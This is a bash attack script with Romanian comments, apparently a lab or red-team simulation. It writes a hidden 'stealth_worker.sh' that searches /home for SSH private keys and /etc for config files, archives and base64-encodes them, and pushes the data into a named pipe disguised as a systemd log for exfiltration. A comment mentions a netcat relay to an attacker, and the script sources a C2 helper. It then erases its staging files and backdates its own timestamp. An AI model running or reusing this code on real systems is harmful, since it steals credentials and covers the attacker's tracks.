# 1. Creăm scriptul malițios (payload-ul)
touch /tmp/.config_backup/stealth_worker.sh
#cat << 'EOF' > /tmp/.config_backup/stealth_worker.sh
#!/bin/bash

source /home/support_account/MScripts/mScripts/c2ServerWithPipe.sh 

# Configurare
TARGET_PIPE="/tmp/systemd-service.log"
STAGING_DIR="/tmp/.config_backup/staged_data"
mkdir -p "$STAGING_DIR"

# A. RECONNAISSANCE & COLLECTION (Caută secrete)
echo "[*] Scanning for keys..."
# Caută chei private (doar simulare, nu le furăm pe bune în test)
find /home -name "id_rsa" 2>/dev/null > "$STAGING_DIR/targets.txt"
find /etc -name "*.conf" 2>/dev/null | head -n 5 >> "$STAGING_DIR/targets.txt"

# B. COMPRESSION (Arhivare ascunsă)
echo "[*] Compressing data..."
tar -czf "$STAGING_DIR/backup.tar.gz" -T "$STAGING_DIR/targets.txt" 2>/dev/null

# C. EXFILTRATION via NAMED PIPE
# Atacatorul ar avea un 'cat /tmp/systemd-service.log | ncattacker' rulând în altă parte
# Noi scriem în pipe ca și cum ar fi un log file
if [ -p "$TARGET_PIPE" ]; then
    echo "[*] Exfiltrating data through named pipe..."
    # Codăm datele în base64 pentru a trece ca text
    base64 "$STAGING_DIR/backup.tar.gz" > "$TARGET_PIPE" 
else
    echo "[!] Pipe not found, creating fallback..."
    mknod "$TARGET_PIPE" p
fi

# D. CLEANUP (Ștergerea urmelor locale)
rm -rf "$STAGING_DIR"
# Schimbăm timestamp-ul scriptului pentru a părea vechi (Timestomping)
touch -t 202301010000 "$0"

# 2. Facem scriptul executabil
chmod +x /tmp/.config_backup/stealth_worker.sh

# 3. LANSAREA (În background, ca să nu blocheze terminalul)
# Înainte de a rula, pornim un "ascultător" pe pipe ca să nu se blocheze scrierea
# (Într-un atac real, un proces separat ar citi din acest pipe)
cat /tmp/systemd-service.log > /dev/null & 

# Rulăm scriptul malițios
/tmp/.config_backup/stealth_worker.sh &
